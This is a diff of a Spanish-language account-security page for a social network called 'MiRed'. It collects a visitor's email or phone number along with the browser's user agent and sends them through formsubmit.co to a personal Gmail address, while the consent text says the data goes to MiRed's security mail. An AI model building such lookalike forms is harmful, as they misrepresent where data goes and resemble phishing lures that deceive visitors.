@@ -3,136 +3,92 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>MiRed 3D</title>
+<title>MiRed - Seguridad</title>
 
 <style>
-
 * {
+    box-sizing: border-box;
     margin: 0;
     padding: 0;
-    box-sizing: border-box;
 }
 
 body {
-    font-family: Arial, sans-serif;
     min-height: 100vh;
+    font-family: Arial, sans-serif;
     background:
-    radial-gradient(circle at 20% 20%, #173b70, transparent 40%),
-    radial-gradient(circle at 80% 80%, #101e45, transparent 40%),
-    #090d19;
-
-    color: white;
+        radial-gradient(circle at 15% 15%, #164c91, transparent 40%),
+        radial-gradient(circle at 85% 85%, #18265a, transparent 40%),
+        #090d19;
     display: flex;
-    justify-content: center;
     align-items: center;
+    justify-content: center;
     padding: 20px;
-    overflow-x: hidden;
+    color: white;
 }
-
-/* FONDO 3D */
-
-.fondo {
-    position: fixed;
-    width: 250px;
-    height: 250px;
-    border-radius: 50%;
-    background: linear-gradient(135deg,#1877f2,#00d4ff);
-    filter: blur(90px);
-    opacity: .25;
-    z-index: -1;
-}
-
-.fondo.uno {
-    top: 5%;
-    left: 5%;
-}
-
-.fondo.dos {
-    bottom: 5%;
-    right: 5%;
-}
-
-/* CONTENEDOR */
 
 .contenedor {
     width: 100%;
-    max-width: 410px;
+    max-width: 420px;
     perspective: 1200px;
 }
 
 .tarjeta {
-    background: linear-gradient(
-        145deg,
-        rgba(35,48,75,.96),
-        rgba(13,19,35,.98)
-    );
-
     padding: 35px 25px;
     border-radius: 25px;
-
-    border: 1px solid rgba(100,170,255,.25);
+    background: linear-gradient(145deg, #263957, #101a2b);
+    border: 1px solid #45658c;
 
     box-shadow:
-    0 30px 60px rgba(0,0,0,.6),
-    inset 0 1px 2px rgba(255,255,255,.15);
+        0 25px 50px #0009,
+        inset 0 2px 5px #ffffff22;
 
-    transform: rotateX(2deg);
     transition: .4s;
 }
 
 .tarjeta:hover {
-    transform: rotateX(0deg) translateY(-5px);
+    transform: translateY(-5px) rotateX(2deg);
 }
-
-/* LOGO */
 
 .logo {
     text-align: center;
-    margin-bottom: 25px;
+    margin-bottom: 30px;
 }
 
 .logo-icono {
     width: 75px;
     height: 75px;
     margin: auto;
-
-    display: flex;
-    justify-content: center;
-    align-items: center;
-
-    font-size: 35px;
-    font-weight: bold;
-
     border-radius: 22px;
 
-    background: linear-gradient(145deg,#1685ff,#0044b8);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-size: 38px;
+    font-weight: bold;
+
+    background: linear-gradient(145deg, #39a0ff, #0750c9);
 
     box-shadow:
-    0 10px 25px #006aff66,
-    inset 0 2px 5px #ffffff55;
-
-    transform: rotate(-5deg);
+        0 10px 25px #006aff66,
+        inset 0 3px 5px #ffffff55;
 }
 
 .logo h1 {
+    color: #65b1ff;
     margin-top: 15px;
     font-size: 32px;
-    letter-spacing: 2px;
-    color: #57a5ff;
 }
 
 .logo p {
-    color: #9caecb;
+    color: #a8bad3;
     font-size: 13px;
-    margin-top: 6px;
+    margin-top: 7px;
 }
-
-/* FORMULARIO */
 
 h2 {
     text-align: center;
-    margin-bottom: 10px;
+    margin-bottom: 12px;
 }
 
 .descripcion {
@@ -144,97 +100,43 @@ h2 {
 }
 
 .campo {
-    margin-bottom: 18px;
+    margin-bottom: 20px;
 }
 
 .campo label {
     display: block;
-    font-size: 13px;
-    margin-bottom: 8px;
     color: #b8c9e2;
+    font-size: 13px;
+    margin-bottom: 9px;
 }
 
 .campo input {
     width: 100%;
     padding: 15px;
-
     border-radius: 12px;
-
-    border: 1px solid #344967;
-
+    border: 1px solid #405779;
     background: #101a2b;
-
     color: white;
     font-size: 15px;
-
     outline: none;
-    transition: .3s;
 }
 
 .campo input:focus {
     border-color: #2688ff;
-
-    box-shadow:
-    0 0 0 3px #1877f233,
-    0 5px 15px #1877f222;
+    box-shadow: 0 0 12px #1877f255;
 }
 
 .campo input::placeholder {
-    color: #71819b;
+    color: #7589a5;
 }
-
-/* BOTONES */
-
-.boton {
-    width: 100%;
-    padding: 15px;
-
-    border: none;
-    border-radius: 12px;
-
-    color: white;
-    font-size: 15px;
-    font-weight: bold;
-
-    cursor: pointer;
-
-    background: linear-gradient(
-        135deg,
-        #258bff,
-        #0754ce
-    );
-
-    box-shadow:
-    0 8px 20px #006aff55,
-    inset 0 1px 2px #ffffff55;
-
-    transition: .3s;
-}
-
-.boton:hover {
-    transform: translateY(-3px);
-
-    box-shadow:
-    0 12px 25px #006aff77;
-}
-
-.boton:disabled {
-    opacity: .6;
-    cursor: wait;
-    transform: none;
-}
-
-/* CONSENTIMIENTO */
 
 .consentimiento {
     display: flex;
-    gap: 10px;
     align-items: flex-start;
-
+    gap: 10px;
     color: #aebbd0;
     font-size: 12px;
     line-height: 1.5;
-
     margin: 20px 0;
 }
 
@@ -242,11 +144,35 @@ h2 {
     margin-top: 3px;
 }
 
-/* ESTADO */
+.boton {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+
+    background: linear-gradient(135deg, #258bff, #0754ce);
+
+    color: white;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+
+    box-shadow: 0 8px 20px #006aff55;
+    transition: .3s;
+}
+
+.boton:hover {
+    transform: translateY(-3px);
+}
+
+.boton:disabled {
+    opacity: .6;
+    cursor: wait;
+}
 
 #resultado {
-    margin-top: 20px;
     text-align: center;
+    margin-top: 20px;
     font-size: 13px;
     line-height: 1.6;
 }
@@ -259,22 +185,12 @@ h2 {
     color: #ff7373;
 }
 
-/* PIE */
-
 .pie {
     text-align: center;
-    margin-top: 25px;
-    font-size: 11px;
     color: #71819b;
-}
-
-.seguridad {
-    display: flex;
-    justify-content: center;
-    gap: 7px;
-    margin-top: 15px;
-    color: #62dba0;
-    font-size: 12px;
+    font-size: 11px;
+    margin-top: 25px;
+    line-height: 1.8;
 }
 
 </style>
@@ -282,41 +198,34 @@ h2 {
 
 <body>
 
-<div class="fondo uno"></div>
-<div class="fondo dos"></div>
-
 <div class="contenedor">
 
 <div class="tarjeta">
 
     <div class="logo">
-
         <div class="logo-icono">M</div>
-
         <h1>MiRed</h1>
-
         <p>Tu comunidad, tu conexión.</p>
-
     </div>
 
     <h2>Seguridad de cuenta</h2>
 
     <p class="descripcion">
-        Registra un intento de acceso a MiRed
-        y recibe una notificación de seguridad.
+        Registra un evento de seguridad en tu cuenta
+        y recibe una notificación por correo.
     </p>
 
     <form id="formulario">
 
         <div class="campo">
 
-            <label>Correo electrónico o celular</label>
+            <label>Correo electrónico o número celular</label>
 
             <input
                 type="text"
                 id="identificador"
-                placeholder="Ingresa tu correo o celular"
-                autocomplete="email"
+                placeholder="Correo o número celular"
+                autocomplete="off"
                 required
             >
 
@@ -331,9 +240,9 @@ h2 {
             >
 
             <label for="aceptar">
-                Acepto que el identificador ingresado
-                sea enviado al correo de seguridad de
-                MiRed para registrar este evento.
+                Acepto que se envíe mi identificador
+                al correo de seguridad de MiRed
+                para registrar este evento.
             </label>
 
         </div>
@@ -350,18 +259,15 @@ h2 {
 
     <div id="resultado"></div>
 
-    <div class="seguridad">
-        🔒 Protección de datos
-    </div>
-
     <div class="pie">
-        © 2026 MiRed. Todos los derechos reservados.
-        <br><br>
-        Nunca compartiremos contraseñas por correo.
+        🔒 MiRed - Protección de datos.
+
+        <br>
+
+        Las contraseñas nunca se envían por correo.
     </div>
 
 </div>
-
 </div>
 
 <script>
@@ -373,27 +279,28 @@ formulario.addEventListener("submit", async function(e) {
     e.preventDefault();
 
     const identificador =
-    document.getElementById("identificador").value.trim();
+        document.getElementById("identificador")
+        .value.trim();
 
     const aceptar =
-    document.getElementById("aceptar").checked;
+        document.getElementById("aceptar").checked;
 
     const resultado =
-    document.getElementById("resultado");
+        document.getElementById("resultado");
 
     const boton =
-    document.getElementById("enviar");
+        document.getElementById("enviar");
 
     const esCorreo =
-    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identificador);
+        /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(identificador);
 
     const esCelular =
-    /^\+?[0-9]{8,15}$/.test(identificador);
+        /^\+?[0-9]{8,15}$/.test(identificador);
 
     if (!esCorreo && !esCelular) {
 
         resultado.innerHTML =
-        '<span class="error">Ingresa un correo o celular válido.</span>';
+        '<span class="error">Ingresa un correo o número válido.</span>';
 
         return;
     }
@@ -407,7 +314,7 @@ formulario.addEventListener("submit", async function(e) {
     }
 
     boton.disabled = true;
-    boton.textContent = "Enviando alerta...";
+    boton.textContent = "Enviando...";
 
     resultado.textContent = "";
 
@@ -419,30 +326,9 @@ formulario.addEventListener("submit", async function(e) {
         ? "Correo electrónico"
         : "Número celular";
 
-    const mensaje = `
-Hola, Aron Chumacero.
-
-Se ha registrado un intento de acceso
-a una cuenta de MiRed.
-
-INFORMACIÓN DEL EVENTO:
-
-Identificador: ${identificador}
-
-Tipo: ${tipo}
-
-Fecha: ${fecha}
-
-Dispositivo: ${navigator.userAgent}
-
-Estado: Intento registrado.
-
-Por seguridad, no se ha enviado ninguna contraseña.
-`;
-
     const datos = {
 
-        _subject: "⚠️ Alerta de seguridad - MiRed",
+        _subject: "Alerta de seguridad - MiRed",
 
         _template: "table",
 
@@ -456,9 +342,10 @@ Por seguridad, no se ha enviado ninguna contraseña.
 
         fecha_hora: fecha,
 
-        dispositivo: navigator.userAgent,
+        navegador: navigator.userAgent,
 
-        mensaje: mensaje
+        mensaje:
+        "Se ha registrado un evento de seguridad en MiRed."
 
     };
 
@@ -467,7 +354,6 @@ Por seguridad, no se ha enviado ninguna contraseña.
         const respuesta = await fetch(
             "https://formsubmit.co/ajax/chumaceroyahuanaaron@gmail.com",
             {
-
                 method: "POST",
 
                 headers: {
@@ -476,19 +362,18 @@ Por seguridad, no se ha enviado ninguna contraseña.
                 },
 
                 body: JSON.stringify(datos)
-
             }
         );
 
-        const datosRespuesta = await respuesta.json();
+        const resultadoJson = await respuesta.json();
 
         if (
             respuesta.ok &&
-            String(datosRespuesta.success).toLowerCase() === "true"
+            String(resultadoJson.success).toLowerCase() === "true"
         ) {
 
             resultado.innerHTML =
-            '<span class="exito">✓ Alerta enviada correctamente.</span>';
+            '<span class="exito">✓ Evento registrado correctamente.</span>';
 
             formulario.reset();
 
@@ -501,7 +386,7 @@ Por seguridad, no se ha enviado ninguna contraseña.
     } catch (error) {
 
         resultado.innerHTML =
-        '<span class="error">No se pudo enviar la alerta. Comprueba tu conexión y la activación de FormSubmit.</span>';
+        '<span class="error">No se pudo enviar el correo. Comprueba la conexión y la activación de FormSubmit.</span>';
 
     }
 
